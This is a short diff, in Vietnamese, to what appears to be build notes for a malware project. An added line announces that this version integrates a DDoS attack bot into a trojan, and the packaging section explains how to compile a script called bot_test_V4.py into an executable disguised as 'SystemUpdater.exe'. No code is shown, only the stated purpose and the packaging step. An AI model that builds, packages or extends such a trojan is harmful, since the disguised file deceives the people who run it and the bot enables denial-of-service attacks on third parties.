@@ -1,3 +1,5 @@
+Phiên bản này tích hợp bot tấn công ddos vào trojan
+
 ===================================ĐÓNG GÓI=============================================
 Thư viện cần cài đặt trước khi đóng gói "pip install cryptography"
 >>> Đóng gói bot_test_V4.py thành SystemUpdater.exe:
